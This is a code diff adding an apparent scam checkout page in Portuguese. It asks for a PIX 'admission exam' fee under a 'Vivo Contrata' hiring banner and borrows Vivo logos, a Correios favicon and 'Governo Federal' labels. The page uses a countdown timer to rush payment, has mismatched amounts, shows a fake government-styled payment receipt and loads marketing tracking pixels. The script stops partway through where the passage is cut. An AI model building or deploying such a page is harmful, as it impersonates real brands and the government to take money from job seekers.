@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+       
+  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vivo Contrata | Pagamento PIX</title>
+    <link rel="shortcut icon" href="https://www.correios.com.br/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+
+
+
+<script>
+  window.pixelId = "68378463cbf7e2d2b03bad5f";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'correios-blue': '#660099',
+                        'correios-yellow': '#BA55D3',
+                        'correios-light-blue': '#0067B1',
+                        'correios-gray': '#F8F8F8',
+                        'correios-dark': '#333333'
+                    },
+                    fontFamily: {
+                        'roboto': ['Roboto', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        :root {
+            --correios-blue: #660099;
+            --correios-yellow: #BA55D3;
+            --correios-light-blue: #0067B1;
+        }
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #F8F8F8;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+        
+        .correios-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .correios-header {
+            background-color: #FFFFFF;
+            border-bottom: 2px solid #BA55D3;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .correios-button {
+            background-color: #660099;
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border-radius: 4px;
+            padding: 10px 16px;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .correios-button:hover {
+            background-color: #0067B1;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+        }
+        
+        .correios-outline-button {
+            border: 2px solid #660099;
+            color: #660099;
+            transition: all 0.3s ease;
+        }
+        
+        .correios-outline-button:hover {
+            background-color: #660099;
+            color: white;
+        }
+        
+        .correios-card {
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        .correios-input {
+            border: 1px solid #DDDDDD;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #FFFFFF;
+        }
+        
+        .correios-input:disabled {
+            background-color: #F5F5F5;
+            color: #555;
+        }
+        
+        .correios-badge {
+            background-color: #0067B1;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .correios-timer {
+            color: #FF3333;
+            font-weight: bold;
+        }
+        
+        .correios-loading {
+            border-top-color: #660099;
+        }
+        
+        .correios-success-icon {
+            color: #0067B1;
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        /* Adiciona estilos para o popup de notificação */
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #0067B1;
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+  }
+        
+        /* Estilo de loading em tela cheia */
+        .loading-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: rgba(255, 255, 255, 0.95);
+            z-index: 9999;
+        }
+        
+        .loading-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        
+        .loading-logo {
+            max-width: 100px;
+            margin-bottom: 1.5rem;
+        }
+        
+        .loading-spinner {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1.5rem;
+        }
+        
+        .loading-spinner:before {
+            content: '';
+            box-sizing: border-box;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid #f3f3f3;
+            border-top-color: #660099;
+            border-right-color: #BA55D3;
+            animation: spinner 1s linear infinite;
+        }
+        
+        @keyframes spinner {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        /* Estilos do QR Code */
+        .qrcode-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .qrcode-header {
+            background-color: #660099;
+            color: white;
+            padding: 1rem;
+            position: relative;
+        }
+        
+        .qrcode-header:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: #BA55D3;
+        }
+        
+        .qrcode-badge {
+            position: absolute;
+            top: 0;
+            right: 0;
+            transform: translate(50%, -50%);
+            background: #BA55D3;
+            color: #660099;
+            font-weight: bold;
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        
+        .correios-track-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 1.5rem 0;
+            position: relative;
+            padding: 0 1rem;
+        }
+        
+        .correios-track-bar:before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: #E0E0E0;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+        
+        .correios-track-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #660099;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .correios-track-step.active {
+            background-color: #BA55D3;
+            color: #660099;
+        }
+
+        .correios-pattern-bg {
+            background-color: #f5f5f5;
+            background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23002f87' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+        
+        .correios-envelope-icon {
+            position: relative;
+            width: 24px;
+            height: 24px;
+        }
+        
+        .correios-envelope-icon:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--correios-blue);
+            mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='currentColor'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z' /%3E%3C/svg%3E");
+            mask-size: contain;
+            mask-repeat: no-repeat;
+            mask-position: center;
+        }
+        
+        .correios-stamp {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            border: 1px dashed var(--correios-blue);
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            background-color: rgba(255, 255, 255, 0.8);
+            font-size: 6px;
+            color: var(--correios-blue);
+            font-weight: bold;
+            transform: rotate(5deg);
+        }
+        
+        .correios-stamp:before {
+            content: '';
+            width: 30px;
+            height: 20px;
+            background-image: linear-gradient(45deg, var(--correios-blue) 25%, transparent 25%), 
+                              linear-gradient(-45deg, var(--correios-blue) 25%, transparent 25%), 
+                              linear-gradient(45deg, transparent 75%, var(--correios-blue) 75%), 
+                              linear-gradient(-45deg, transparent 75%, var(--correios-blue) 75%);
+            background-size: 4px 4px;
+            background-position: 0 0, 0 2px, 2px -2px, -2px 0px;
+            opacity: 0.2;
+            border-radius: 1px;
+            margin-bottom: 2px;
+        }
+        
+        .correios-signature {
+            position: absolute;
+            bottom: 15px;
+            right: 20px;
+            font-family: cursive;
+            color: #023E8A;
+            font-size: 14px;
+            transform: rotate(-5deg);
+        }
+        
+        .correios-dots {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 10px;
+            width: 2px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-around;
+        }
+        
+        .correios-dots span {
+            width: 2px;
+            height: 2px;
+            background-color: var(--correios-blue);
+            opacity: 0.5;
+            border-radius: 50%;
+  }
+</style>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "rqs6jaszdp");
+</script>
+
+</head>
+
+<body class="min-h-screen correios-pattern-bg">
+    <noscript><img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=1367280367744436&ev=PageView&noscript=1"
+        /></noscript>
+        
+            <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+    
+    <!-- Header dos Governo Federal -->
+<header class="correios-header flex flex-col items-center py-4 shadow-sm mb-0">
+  <div class="w-full max-w-6xl flex justify-center items-center">
+    <img
+      src="images/vivo__1_-removebg-preview.png"
+      alt="Governo Federal"
+      class="h-16 md:h-20"
+    >
+  </div>
+</header>
+
+
+    <div id="loadingPage" class="loading-fullscreen fade-in">
+        <div class="loading-container">
+            <div class="flex flex-col items-center justify-center mb-8">
+                <img src="images/vivo__1_-removebg-preview.png" alt="Governo Federal" class="loading-logo">
+                <div class="h-1 bg-blue-300 w-48 mt-2"></div>
+            </div>
+            
+            <div class="bg-white p-8 rounded-lg shadow-md relative max-w-md w-full">
+                <div class="loading-spinner"></div>
+                <h2 class="text-2xl font-bold text-[#660099] mb-2">Processando seu pagamento</h2>
+                <p id="loadingMessage" class="text-gray-600">Por favor, aguarde enquanto preparamos seu código de pagamento...</p>
+                
+                <div class="mt-8 w-full">
+                    <div class="correios-track-bar">
+                        <div class="correios-track-step active">1</div>
+                        <div class="correios-track-step">2</div>
+                        <div class="correios-track-step">3</div>
+                    </div>
+                    <div class="flex justify-between text-xs text-gray-500 px-1">
+                        <span>Processando</span>
+                        <span>Gerando QR Code</span>
+                        <span>Concluído</span>
+                    </div>
+                </div>
+                
+                <!-- Ícones dos Governo Federal -->
+                <div class="flex justify-center gap-8 mt-8">
+                    <div class="flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#660099]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" />
+                        </svg>
+                        <span class="text-xs text-gray-600 mt-1">Segurança</span>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#660099]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                        </svg>
+                        <span class="text-xs text-gray-600 mt-1">Rapidez</span>
+                    </div>
+                    <div class="flex flex-col items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#660099]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                        </svg>
+                        <span class="text-xs text-gray-600 mt-1">Confiança</span>
+                    </div>
+                </div>
+                
+                <div class="mt-6 text-xs text-center text-gray-500 border-t border-gray-200 pt-4">
+                    Processamento seguro pela Vivo
+                </div>
+                
+                <div class="absolute top-3 right-3 w-12 h-12">
+  <img src="images/channels4_profile-removebg-preview.png" alt="Governo Federal" class="w-full h-full object-contain rounded">
+</div>
+
+            </div>
+        </div>
+    </div>
+
+    <main id="loginPage" class="flex flex-col h-full gap-2 bg-white shadow-md max-w-md mx-auto correios-card fade-in hidden" style="border-top-left-radius: 0; border-top-right-radius: 0; margin-top: 0; padding-top: 0;">
+        <!-- Cabeçalho com informações do serviço -->
+        <div class="qrcode-header px-6 py-4 flex items-center justify-between" style="border-radius: 0;">
+            <div class="flex items-center">
+                <div class="correios-envelope-icon mr-2"></div>
+            <div>
+                    <h2 class="text-xl font-medium text-white">Pagamento via PIX</h2>
+                    <p class="text-sm text-gray-100">Exame Admissional - <span id="valorTitulo" class="font-medium">R$ 67,83</span></p>
+            </div>
+            </div>
+        </div>
+
+        <!-- Conteúdo do QR Code -->
+        <div class="px-6 pt-6 relative">
+            <div class="absolute top-3 right-3 w-12 h-12">
+  <img src="images/channels4_profile-removebg-preview.png" alt="Governo Federal" class="w-full h-full object-contain rounded">
+</div>
+            <div class="correios-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <!-- Informação de rastreamento visível -->
+            <div class="bg-blue-50 border-l-4 border-blue-600 p-3 mb-4">
+                <div class="flex items-start">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-blue-600 mr-2 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div>
+                        <p class="text-sm font-medium text-blue-800">Importante</p>
+                        <p class="text-xs text-blue-700">O código PIX expira em <span id="timer" class="font-bold">15:00</span></p>
+                        <button id="regenerarPix" class="text-xs mt-1 text-blue-800 underline hover:no-underline">Gerar novo código</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Banner de valor destacado -->
+            <div class="text-xs px-2 py-1 bg-blue-100 text-blue-900 rounded-md font-medium">
+                <div class="flex items-center justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-yellow-600 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2zm7-5a2 2 0 11-4 0 2 2 0 014 0z" />
+                    </svg>
+                    <div>
+                        <p class="text-blue-900 text-sm">Total a pagar:</p>
+                        <p class="text-blue-800 font-bold text-xl" id="valorPagamentoBanner">R$ 62,90</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Divisão do QR Code -->
+            <div class="flex flex-col md:flex-row gap-6">
+                <!-- QR Code à esquerda -->
+                <div class="w-full md:w-1/2 flex justify-center">
+                    <div id="imagemContainer" class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 cursor-pointer hover:bg-gray-50 transition-colors group relative" style="min-height: 200px; display: flex; align-items: center; justify-content: center;" onclick="document.getElementById('copiar-codigo').click()">
+                    <div class="absolute inset-0 flex items-center justify-center opacity-0 group-hover:opacity-100 bg-black bg-opacity-50 transition-opacity rounded-lg">
+                            <span class="text-white text-xs font-medium px-3 py-2 bg-blue-800 rounded-md">Clique para copiar o código PIX</span>
+                    </div>
+                    <!-- QR Code será inserido aqui via JavaScript -->
+                    <div class="text-center text-gray-500">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v1m6 11h2m-6 0h-2v4m0-11v3m0 0h.01M12 12h4.01M16 20h4M4 12h4m12 0h.01M5 8h2a1 1 0 001-1V5a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1zm12 0h2a1 1 0 001-1V5a1 1 0 00-1-1h-2a1 1 0 00-1 1v2a1 1 0 001 1zM5 20h2a1 1 0 001-1v-2a1 1 0 00-1-1H5a1 1 0 00-1 1v2a1 1 0 001 1z" />
+                        </svg>
+                        <p>Carregando QR Code...</p>
+                    </div>
+                </div>
+            </div>
+
+                <!-- Código PIX - Movido para cima das instruções -->
+                <div class="w-full md:w-1/2">
+                    <p class="text-sm font-medium mb-2 text-gray-700">
+                        Código PIX para cópia:
+                    </p>
+                    <div class="bg-gray-50 p-3 rounded-md border border-gray-200 mb-4">
+                        <div class="flex justify-between items-center mb-1">
+                            <label for="codigo-input" class="block text-xs font-medium text-gray-500">
+                                Código PIX:
+                </label>
+                            <div class="text-xs px-2 py-1 bg-blue-100 text-blue-900 rounded-md font-medium">Copia e Cola</div>
+                        </div>
+                        <div class="relative">
+                            <input id="codigo-input" type="text" disabled="" class="text-sm font-medium border border-gray-300 py-2 px-3 w-full rounded bg-white text-gray-700">
+                            <div class="absolute inset-y-0 right-0 flex items-center pr-3">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                </svg>
+                            </div>
+                        </div>
+            </div>
+            
+                    <!-- Botão de copiar código PIX - Movido para dentro da div do código PIX -->
+                    <button id="copiar-codigo" class="correios-button w-full py-3 mb-4 flex items-center justify-center">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3" />
+                </svg>
+                COPIAR CÓDIGO PIX
+            </button><br><br>
+            
+                    <!-- Instruções  -->
+                    <h3 class="text-sm font-bold text-blue-800 mb-2">Como pagar:</h3>
+                    <ol class="text-xs text-gray-700 space-y-2 mb-4">
+                        <li class="flex items-start">
+                            <span class="bg-purple-700 text-white w-5 h-5 rounded-full flex items-center justify-center text-xs font-bold mr-2 shrink-0">1</span>
+                            <span>Abra o aplicativo do seu banco</span>
+                        </li>
+                        <li class="flex items-start">
+                            <span class="bg-purple-700 text-white w-5 h-5 rounded-full flex items-center justify-center text-xs font-bold mr-2 shrink-0">2</span>
+                            <span>Escolha a opção PIX e escaneie o QR Code ou copie e cole o código</span>
+                        </li>
+                        <li class="flex items-start">
+                            <span class="bg-purple-700 text-white w-5 h-5 rounded-full flex items-center justify-center text-xs font-bold mr-2 shrink-0">3</span>
+                            <span>Confirme o pagamento</span>
+                        </li>
+                    </ol>
+                </div>
+            </div>
+
+            <!-- Botão de teste para simular pagamento confirmado -->
+            <button id="teste-confirmacao" style="display: none;" class="mt-3 text-xs text-gray-500 border border-gray-300 rounded-md px-2 py-1 hover:bg-gray-100 flex items-center justify-center mx-auto">
+            
+               
+            </button>
+            
+            <div class="mt-6 pt-6 border-t border-gray-200">
+                <div class="flex items-center justify-center gap-3">
+                    <img src="images/vivo__1_-removebg-preview.png" alt="Governo Federal" class="h-14">
+                    <div class="h-6 w-px bg-gray-300"></div>
+                    <img src="images/pix-logo.png" alt="PIX" class="h-6">
+                </div>
+                <p class="text-xs text-center text-gray-500 mt-3">
+                    Pagamento processado com segurança pela Vivo
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <!-- Nova div para pagamento confirmado -->
+    <div id="pagamentoConfirmado" class="hidden flex flex-col h-full gap-2 rounded-b-md bg-white shadow-md max-w-md mx-auto correios-card fade-in" style="border-top-left-radius: 0; border-top-right-radius: 0; margin-top: 0;">
+        <div class="qrcode-header py-4 px-6 flex items-center">
+            <div class="correios-envelope-icon mr-2"></div>
+            <h1 class="text-xl font-bold">Pagamento Confirmado!</h1>
+        </div>
+        <div class="px-6 pt-4 relative">
+            <!-- removido: carimbo Correios -->
+                
+            </div>
+            
+            <div class="correios-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <div class="flex flex-col gap-4 items-center justify-center py-8">
+                <div class="bg-green-100 rounded-full p-3">
+                    <svg class="w-14 h-14 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                </svg>
+                </div>
+                <p class="text-lg font-medium text-gray-800 text-center">O pagamento foi processado com sucesso</p>
+                
+                <!-- Comprovante estilizado -->
+                <div class="bg-gray-50 p-5 rounded-md w-full mt-4 border border-gray-200 relative">
+                    <div class="flex justify-between items-center mb-1">
+                        <span class="text-xs uppercase font-bold text-gray-500">Comprovante de pagamento</span>
+                        <img src="images/govlogo.png" alt="Governo Federal" class="h-4">
+                    </div>
+                    <div class="h-px w-full bg-gray-300 my-2"></div>
+                    
+                    <div class="flex justify-between items-center py-2 border-b border-gray-200">
+                        <span class="text-sm text-gray-600">Data:</span>
+                        <span id="data-pagamento" class="font-medium text-sm">00/00/0000</span>
+                    </div>
+                    <div class="flex justify-between items-center py-2 border-b border-gray-200">
+                        <span class="text-sm text-gray-600">Hora:</span>
+                        <span id="hora-pagamento" class="font-medium text-sm">00:00</span>
+                    </div>
+                    <div class="flex justify-between items-center py-2">
+                        <span class="text-sm text-gray-600">Protocolo:</span>
+                        <span id="protocolo-pagamento" class="font-medium text-sm">COR-2023-0000</span>
+                    </div>
+                    
+                    <div class="h-px w-full bg-gray-300 my-3"></div>
+                    <div class="flex justify-center">
+                        <div class="flex items-center text-xs text-green-700">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                            </svg>
+                            Pagamento confirmado e processado
+                        </div>
+                    </div>
+                    
+                    <div class="correios-signature">Governo Federal Digital</div>
+                </div>
+                
+                <button class="correios-outline-button mt-4 py-2 px-4 text-sm flex items-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 17h2a2 2 0 002-2v-4a2 2 0 00-2-2H5a2 2 0 00-2 2v4a2 2 0 002 2h2m2 4h6a2 2 0 002-2v-4a2 2 0 00-2-2H9a2 2 0 00-2 2v4a2 2 0 002 2zm8-12V5a2 2 0 00-2-2H9a2 2 0 00-2 2v4h10z" />
+                    </svg>
+                    Imprimir comprovante
+                </button>
+                
+                <p class="text-sm text-gray-600 mt-4">Agradecemos por utilizar os serviços dos Governo Federal</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loadingPage = document.getElementById('loadingPage');
+            const loginPage = document.getElementById('loginPage');
+            const imagemContainer = document.getElementById('imagemContainer');
+            const codigoInput = document.getElementById('codigo-input');
+            const copiarCodigo = document.getElementById('copiar-codigo');
+            const pagamentoConfirmado = document.getElementById('pagamentoConfirmado');
+            const testeConfirmacao = document.getElementById('teste-confirmacao');
+            
+            console.log('Checkout dos Governo Federal inicializado');
+            
+            // Obter valor da URL se existir
+            const urlParams = new URLSearchParams(window.location.search);
+            const valorPagamento = urlParams.get('valor');
+            if (valorPagamento) {
+                console.log('Valor do pagamento obtido da URL:', valorPagamento);
+            }
+            
+            // Configurar data atual no comprovante
+            const dataAtual = new Date();
+            const dataFormatada = dataAtual.toLocaleDateString('pt-BR');
+            document.getElementById('data-pagamento').textContent = dataFormatada;
+            
+            // Configurar hora atual no comprovante
+            const horaFormatada = dataAtual.toLocaleTimeString('pt-BR', {hour: '2-digit', minute: '2-digit'});
+            document.getElementById('hora-pagamento').textContent = horaFormatada;
+            
+            // Configurar protocolo aleatório
+            const protocolo = 'COR-' + Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+            document.getElementById('protocolo-pagamento').textContent = protocolo;
+            
+            // Timer regressivo
+            let tempoRestante = 15 * 60; // 15 minutos em segundos
+            const timerElement = document.getElementById('timer');
+            let timerInterval;
+            
+            function atualizarTimer() {
+                const minutos = Math.floor(tempoRestante / 60);
+                const segundos = tempoRestante % 60;
+                timerElement.textContent = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+                
+                if (tempoRestante <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = "Expirado";
+                    timerElement.classList.add('text-red-600');
+                    
+                    // Limpar dados do pagamento expirado
+                    localStorage.removeItem('pixPaymentData');
+                    localStorage.removeItem('pixExpiresAt');
+                    
+                    // Mostrar mensagem de expiração
+                    document.getElementById('regenerarPix').textContent = "Gerar novo código (expirado)";
+                    document.getElementById('regenerarPix').classList.add('font-bold', 'text-red-600');
+                    
+                    // Desabilitar o código PIX e o botão de copiar
+                    codigoInput.disabled = true;
+                    codigoInput.classList.add('bg-gray-200');
+                    copiarCodigo.disabled = true;
+                    copiarCodigo.classList.add('opacity-50', 'cursor-not-allowed');
+                    
+                    // Adicionar banner de expiração sobre o QR code
+                    const qrCodeElement = document.querySelector('#imagemContainer img');
+                    if (qrCodeElement) {
+                        const qrCodeContainer = qrCodeElement.parentElement;
+                        qrCodeElement.classList.add('opacity-30');
+                        
+                        // Criar elemento para mensagem de expirado
+                        const expiredBanner = document.createElement('div');
+                        expiredBanner.className = 'absolute inset-0 flex items-center justify-center bg-red-500 bg-opacity-70 rounded-lg';
+                        expiredBanner.innerHTML = '<span class="text-white font-bold text-center px-4">CÓDIGO EXPIRADO<br>Clique em "Gerar novo código"</span>';
+                        qrCodeContainer.appendChild(expiredBanner);
+                    }
+                } else {
+                    tempoRestante--;
+                }
+            }
+            
+            function iniciarTimer() {
+                // Limpar timer anterior se existir
+                if (timerInterval) {
+                    clearInterval(timerInterval);
+                }
+                
+                // Resetar classes do timer
+                timerElement.classList.remove('text-red-600');
+                
+                timerInterval = setInterval(atualizarTimer, 1000);
+                atualizarTimer();
+            }
+
+            // Função para gerar o PIX
+            async function gerarPix() {
+                // Verificar se já existe um pagamento armazenado
+                const pagamentoArmazenado = localStorage.getItem('pixPaymentData');
+                const expiraEm = localStorage.getItem('pixExpiresAt');
+                const now = new Date().getTime();
+                
+                // Restaurar estado do botão de regenerar
+                document.getElementById('regenerarPix').textContent = "Gerar novo código";
+                document.getElementById('regenerarPix').classList.remove('font-bold', 'text-red-600');
+                
+                // Habilitar o código PIX e o botão de copiar
+                codigoInput.disabled = false;
+                codigoInput.classList.remove('bg-gray-200');
+                copiarCodigo.disabled = false;
+                copiarCodigo.classList.remove('opacity-50', 'cursor-not-allowed');
+                
+                // Se temos um pagamento armazenado e ele ainda não expirou (15 minutos = 900000ms)
+                if (pagamentoArmazenado && expiraEm && now < parseInt(expiraEm)) {
+                    console.log('Usando pagamento existente do armazenamento local');
+                    const data = JSON.parse(pagamentoArmazenado);
+                    
+                    // Atualizar o timer
+                    tempoRestante = Math.floor((parseInt(expiraEm) - now) / 1000);
+                    if (tempoRestante < 0) tempoRestante = 0;
+                    
+                    // Mostrar os dados do pagamento existente
+                    mostrarDadosPagamento(data);
